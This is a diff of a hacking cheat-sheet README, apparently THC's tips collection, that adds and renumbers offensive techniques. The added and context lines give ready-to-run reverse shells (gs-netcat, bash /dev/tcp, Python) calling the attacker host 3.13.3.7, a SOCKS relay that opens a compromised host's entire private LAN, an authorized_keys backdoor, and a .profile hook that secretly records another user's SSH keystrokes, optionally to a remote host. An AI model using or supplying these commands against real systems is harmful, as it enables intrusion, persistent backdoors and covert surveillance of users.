@@ -32,6 +32,7 @@ Got tricks? Send them to root@thc.org or submit a pull request.
    1. [File transfer using screen from LOCAL to REMOTE](#ftslr-anchor)
 5. [Reverse Shell / Dumb Shell](#rs-anchor)
    1. [Reverse Shells](#rs-anchor)
+      1. [with gs-netcat](#rswg-anchor)
       1. [with Bash](#rswb-anchor)
       1. [without Bash](#rswob-anchor)
       1. [with Python](#rswpy-anchor)
@@ -44,6 +45,7 @@ Got tricks? Send them to root@thc.org or submit a pull request.
  6. [Backdoors](#bd-anchor)
     1. [Background reverse shell](#bdrs-anchor)
     1. [authorized_keys](#bdak-anchor)
+    1. [Remote access an entire network](#bdra-anchor)
  7. [Shell Hacks](#sh-anchor)
     1. [Shred files (secure delete)](#shsf-anchor)
     1. [Shred files without *shred*](#shsfwo-anchor)
@@ -56,6 +58,7 @@ Got tricks? Send them to root@thc.org or submit a pull request.
     1. [Encrypting a file](#cref-anchor)
  9. [Miscellaneous](#misc-anchor)
     1. [Sniff a user's SSH session](#sss-anchor)
+    1. [Sniff a user's SSH session without strace](#ssswos-anchor)
     1. [Sniff a user's SSH session without root privileges](#ssswor-anchor)
     1. [How to survive high latency connections](#hlc-anchor)
     
@@ -319,8 +322,24 @@ Note: Two C-d are required due to a [bug in openssl](https://github.com/openssl/
 
 ---
 <a id="rs-anchor"></a>
+<a id="rswg-anchor"></a>
+**5.i.a. Reverse shell with gs-netcat**
+
+Install [gs-netcat](https://github.com/hackerschoice/gsocket). It spawns a fully functional PTY reverse shell without the need of a Command & Controll server. If netcat is the equivalent to a swiss army knife than gs-netcat is a german battle axe.
+
+```
+$ ./gs-netcat -s MySecret -l -i    # Host
+```
+Use -D to start the reverse shell in the background (daemon) and with a watchdog to auto-restart if killed.
+
+To connect to the shell from your workstation:
+```
+$ ./gs-netcat -s MySecret -i
+```
+Use -T to tunnel trough TOR.
+
 <a id="rswb-anchor"></a>
-**5.i.a. Reverse shell with Bash**
+**5.i.b. Reverse shell with Bash**
 
 Start netcat to listen on port 1524 on your system:
 ```
@@ -333,7 +352,7 @@ $ setsid bash -i &>/dev/tcp/3.13.3.7/1524 0>&1 &
 ```
 
 <a id="rswob-anchor"></a>
-**5.i.b. Reverse shell without Bash**
+**5.i.c. Reverse shell without Bash**
 
 Especially embedded systems do not always have Bash and the */dev/tcp/* trick will not work. There are many other ways (Python, PHP, Perl, ..). Our favorite is to upload netcat and use netcat or telnet:
 
@@ -364,13 +383,13 @@ Note: Use */tmp/.fio* if */dev/shm* is not available.
 Note: This trick logs your commands to a file. The file will be *unlinked* from the fs after 60 seconds but remains useable as a 'make shift pipe' as long as the reverse tunnel is started within 60 seconds.
 
 <a id="rswpy-anchor"></a>
-**5.i.c. Reverse shell with Python**
+**5.i.d. Reverse shell with Python**
 ```
 $ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("3.13.3.7",1524));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
 <a id="rswpl-anchor"></a>
-**5.i.d. Reverse shell with Perl**
+**5.i.e. Reverse shell with Perl**
 
 ```
 # method 1
@@ -476,6 +495,24 @@ ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCktFkgm40GDkqYwJkNZVb+NLqYoUNSPVPLx0VDbJM0
 u1i+MhhnCQxyBZbrWkFWyzEmmHjZdAZCK05FRXYZRI9yadmvo7QKtRmliqABMU9WGy210PTOLMltbt2C
 c3zxLNse/xg0CC16elJpt7IqCFV19AqfHnK4YiXwVJ+M+PyAp/aEAujtHDHp backup@ubuntu
 ```
+<a id="bdra-anchor"></a>
+**6.iii. Remote Access to an entire network**
+
+Install [gs-netcat](https://github.com/hackerschoice/gsocket). It creates a SOCKS relay on the Host's private lan which is accessible through the global socket relay network without the need of a Command & Control server (e.g. directly from your workstation):
+
+```
+$ gs-netcat -l -S       # compromised Host
+```
+
+Now from your workstation you can connect to ANY host on the Host's private LAN:
+```
+$ gs-netcat -p 1080    # Your workstation.
+
+Access route.local:22 on the Host's private LAN from your Workstation:
+$ socat -  "SOCKS4a:127.1:route.local:22"
+```
+
+Use -T to use TOR.
 
 ---
 <a id="sh-anchor"></a>
@@ -614,8 +651,17 @@ $ strace -e trace=read -p <PID> 2>&1 | while read x; do echo "$x" | grep '^read.
 ```
 Dirty way to monitor a user who is using *ssh* to connect to another host from a computer that you control.
 
+<a id="ssswos-anchor"></a>
+**9.ii Sniff a user's SSH session without strace**
+
+The tool 'script' has been part of Unix for decades. Add 'script' to the user's .profile. The user's keystrokes and session will be recorded to ~/.ssh-log.txt the next time the user logs in:
+```
+$ echo 'exec script -qc /bin/bash ~/.ssh-log.txt' >>~/.profile
+```
+Consider using [zap-args](#hya-anchor) to hide the the arguments and /dev/tcp/3.13.3.7/1524 as an output file to log to a remote host.
+
 <a id="ssswor-anchor"></a>
-**9.ii. Sniff a user's SSH session without root privileges**
+**9.iii. Sniff a user's SSH session without root privileges**
 
 Even dirtier way in case */proc/sys/kernel/yama/ptrace_scope* is set to 1 (strace will fail on already running SSH clients unless uid=0)
 
